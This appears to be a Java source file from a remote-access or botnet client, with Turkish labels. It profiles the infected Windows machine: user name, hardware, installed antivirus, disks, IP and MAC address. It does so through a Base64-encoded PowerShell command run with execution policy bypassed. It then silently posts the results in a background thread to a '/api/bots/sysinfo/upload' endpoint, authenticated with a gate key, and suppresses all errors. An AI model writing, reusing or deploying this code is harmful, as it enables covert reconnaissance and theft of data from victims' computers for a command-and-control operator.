import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.io.File;
import java.util.Base64;

public class SystemInfoHandler {

    public static void collectAndSend(String serverUrl, String gateKey, String pcName) {
        new Thread(() -> {
            try {
                String json = collectSystemInfoFull(pcName);

                URL url = new URL(serverUrl + "/api/bots/sysinfo/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                conn.setRequestProperty("Authorization", gateKey);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int code = conn.getResponseCode();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private static String collectSystemInfoFull(String pcName) {
        String userName = System.getProperty("user.name", "Bilinmiyor");
        String osName = System.getProperty("os.name", "Windows");
        String osArch = System.getProperty("os.arch", "x64");
        String osVersion = System.getProperty("os.version", "");
        String osInfo = osName + " (" + osArch + " v" + osVersion + ")";

        String cpu = System.getenv("PROCESSOR_IDENTIFIER");
        if (cpu == null || cpu.trim().isEmpty()) cpu = "Bilinmeyen İşlemci";
        String cpuCores = Runtime.getRuntime().availableProcessors() + " Mantıksal Çekirdek (Izlek)";
        String gpu = "Bilinmiyor";
        String ramTotal = "Bilinmiyor";
        String antivirus = "Windows Defender (Varsayılan)";
        String disks = getDisksFast();
        String localIp = getLocalIpFast();
        String macAddress = getMacAddressFast();
        String motherboard = "Bilinmiyor";
        String uptime = "Bilinmiyor";

        try {
            String psCode = 
                "$ErrorActionPreference = 'SilentlyContinue'; " +
                "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " +
                "$c = Get-CimInstance Win32_Processor | Select-Object -First 1; " +
                "$gNames = (Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name) -join ' / '; " +
                "$b = Get-CimInstance Win32_BaseBoard | Select-Object -First 1; " +
                "$o = Get-CimInstance Win32_OperatingSystem | Select-Object -First 1; " +
                "$m = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2); " +
                "$a = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName) -join ', '; " +
                "$d = (Get-CimInstance Win32_LogicalDisk | Where-Object DriveType -eq 3 | ForEach-Object { $_.DeviceID + ' (' + [math]::Round($_.FreeSpace/1GB, 1) + ' GB bos / ' + [math]::Round($_.Size/1GB, 1) + ' GB)' }) -join ' | '; " +
                "$ip = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' -and $_.IPAddress -notlike '169.254*' }).IPAddress | Select-Object -First 1); " +
                "$mc = ((Get-NetAdapter | Where-Object Status -eq 'Up').MacAddress | Select-Object -First 1); " +
                "$u = if ($o.LastBootUpTime) { (Get-Date) - $o.LastBootUpTime } else { $null }; " +
                "$ut = if ($u) { '{0} gun {1} saat {2} dk' -f $u.Days, $u.Hours, $u.Minutes } else { 'Bilinmiyor' }; " +
                "$obj = [PSCustomObject]@{ " +
                    "cpu = if ($c.Name) { $c.Name.Trim() } else { '' }; " +
                    "cpuCores = if ($c) { \"$($c.NumberOfCores) Çekirdek / $($c.NumberOfLogicalProcessors) Izlek\" } else { '' }; " +
                    "gpu = if ($gNames) { $gNames.Trim() } else { '' }; " +
                    "ramTotal = if ($m) { \"$m GB\" } else { '' }; " +
                    "antivirus = if ($a) { $a } else { 'Windows Defender (Varsayılan)' }; " +
                    "disks = if ($d) { $d } else { '' }; " +
                    "localIp = if ($ip) { $ip } else { '' }; " +
                    "macAddress = if ($mc) { $mc } else { '' }; " +
                    "motherboard = if ($b) { \"$($b.Manufacturer) $($b.Product)\".Trim() } else { '' }; " +
                    "uptime = $ut " +
                "}; " +
                "Write-Output ('SYS_START' + ($obj | ConvertTo-Json -Compress) + 'SYS_END');";

            byte[] utf16Bytes = psCode.getBytes("UTF-16LE");
            String encodedCmd = Base64.getEncoder().encodeToString(utf16Bytes);

            Process process = Runtime.getRuntime().exec(new String[]{
                "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encodedCmd
            });

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                String outStr = sb.toString();
                if (outStr.contains("SYS_START") && outStr.contains("SYS_END")) {
                    String rawJson = outStr.substring(outStr.indexOf("SYS_START") + 9, outStr.indexOf("SYS_END"));

                    cpu = extractJsonVal(rawJson, "cpu", cpu);
                    cpuCores = extractJsonVal(rawJson, "cpuCores", cpuCores);
                    gpu = extractJsonVal(rawJson, "gpu", gpu);
                    ramTotal = extractJsonVal(rawJson, "ramTotal", ramTotal);
                    antivirus = extractJsonVal(rawJson, "antivirus", antivirus);
                    disks = extractJsonVal(rawJson, "disks", disks);
                    localIp = extractJsonVal(rawJson, "localIp", localIp);
                    macAddress = extractJsonVal(rawJson, "macAddress", macAddress);
                    motherboard = extractJsonVal(rawJson, "motherboard", motherboard);
                    uptime = extractJsonVal(rawJson, "uptime", uptime);
                }
            }
        } catch (Exception ignored) {}

        StringBuilder json = new StringBuilder();
        json.append("{");
        json.append("\"pcName\":\"").append(escapeJson(pcName)).append("\",");
        json.append("\"userName\":\"").append(escapeJson(userName)).append("\",");
        json.append("\"osInfo\":\"").append(escapeJson(osInfo)).append("\",");
        json.append("\"cpu\":\"").append(escapeJson(cpu)).append("\",");
        json.append("\"cpuCores\":\"").append(escapeJson(cpuCores)).append("\",");
        json.append("\"gpu\":\"").append(escapeJson(gpu)).append("\",");
        json.append("\"ramTotal\":\"").append(escapeJson(ramTotal)).append("\",");
        json.append("\"antivirus\":\"").append(escapeJson(antivirus)).append("\",");
        json.append("\"disks\":\"").append(escapeJson(disks)).append("\",");
        json.append("\"localIp\":\"").append(escapeJson(localIp)).append("\",");
        json.append("\"macAddress\":\"").append(escapeJson(macAddress)).append("\",");
        json.append("\"motherboard\":\"").append(escapeJson(motherboard)).append("\",");
        json.append("\"uptime\":\"").append(escapeJson(uptime)).append("\"");
        json.append("}");

        return json.toString();
    }

    private static String getDisksFast() {
        StringBuilder disksSb = new StringBuilder();
        try {
            for (File root : File.listRoots()) {
                long totalGB = root.getTotalSpace() / (1024L * 1024L * 1024L);
                long freeGB = root.getFreeSpace() / (1024L * 1024L * 1024L);
                if (totalGB > 0) {
                    if (disksSb.length() > 0) disksSb.append(" | ");
                    disksSb.append(root.getPath().replace("\\", "")).append(" (").append(freeGB).append(" GB bos / ").append(totalGB).append(" GB)");
                }
            }
        } catch (Exception ignored) {}
        return disksSb.length() > 0 ? disksSb.toString() : "Bilinmiyor";
    }

    private static String getLocalIpFast() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }

    private static String getMacAddressFast() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            NetworkInterface network = NetworkInterface.getByInetAddress(ip);
            if (network != null) {
                byte[] mac = network.getHardwareAddress();
                if (mac != null) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < mac.length; i++) {
                        sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
                    }
                    return sb.toString();
                }
            }
        } catch (Exception ignored) {}
        return "Bilinmiyor";
    }

    private static String extractJsonVal(String json, String key, String fallback) {
        try {
            String pattern = "\"" + key + "\":\"";
            int idx = json.indexOf(pattern);
            if (idx != -1) {
                int start = idx + pattern.length();
                int end = json.indexOf("\"", start);
                if (end != -1) {
                    String val = json.substring(start, end).trim();
                    if (!val.isEmpty()) return val;
                }
            }
        } catch (Exception ignored) {}
        return fallback;
    }

    private static String escapeJson(String input) {
        if (input == null) return "";
        return input.replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\b", "\\b")
                    .replace("\f", "\\f")
                    .replace("\n", "\\n")
                    .replace("\r", "\\r")
                    .replace("\t", "\\t");
    }
}